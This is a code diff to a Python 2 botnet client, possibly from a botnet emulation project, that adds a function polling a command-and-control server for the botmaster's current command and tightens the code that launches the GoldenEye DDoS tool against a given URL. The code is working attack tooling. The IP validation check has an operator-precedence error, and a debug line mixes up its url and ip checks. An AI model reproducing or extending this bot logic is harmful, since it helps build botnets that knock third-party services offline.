@@ -1,6 +1,8 @@
 #!/usr/bin/env python2
 # coding=UTF-8
-import logging, subprocess, shlex
+import logging, subprocess, shlex, json
+import requests
+import validators
 from resources import emu_config
 
 class BotCommands(object):
@@ -23,18 +25,39 @@ class BotCommands(object):
             if self.ddos_process is not None:
                 logging.debug("goldeneye: %s" % self.ddos_process.communicate())
 
-            if url:
-                logging.info("timeout -s SIGINT %d goldeneye %s -m random "%(timeout, url))
-                ddos_process = subprocess.Popen(shlex.split("timeout %d goldeneye %s -m random "%(timeout, url)))
-            elif ip:
+            if url is not None and validators.url(url):
+                cmdstr = "timeout %d goldeneye '%s' -m random "%(timeout, url)
+                logging.debug(cmdstr)
+                ddos_process = subprocess.Popen(shlex.split(cmdstr))
+            elif ip is not None and validators.ipv4(ip) or validators.ipv6(ip):
                 # TODO: DDOS eine IP
                 pass
             else:
                 logging.warning("Neither ip nor url where supplied, DDOS failed")
+                logging.debug("isurl: %s, isip: %s"%(validators.url(str(url)), validators.ipv4(str(url)) or validators.ipv6(ip)))
         else:
             logging.debug("goldeneye is still running")
 
 cmdobject = BotCommands()
+
+
+def fetchCurrentCommand(cnc, oldCmd=None):
+    """Fetches a command from something that acts like a CnC-Server and executes it. This way the Botmaster controls the clients.
+    The Servent does not need to keep track of their addresses because they pull from it and reverse proxies
+    can be used, so that the clients do not need to know the identity of the Servent. """
+
+    response = requests.get("http://%s:%s/current_command"%(cnc, emu_config.PORT),
+                            headers={"Accept": "application/json"})
+
+    if response.status_code == 200:
+        newCmd = json.loads(response.text)
+        if oldCmd is None or newCmd["timestamp"] > oldCmd["timestamp"]:
+            logging.debug("Replaced command %s with %s"%(oldCmd, newCmd))
+            return newCmd
+        else:
+            return oldCmd
+    else:
+        return oldCmd
 
 
 def executeCurrentCommand(command):
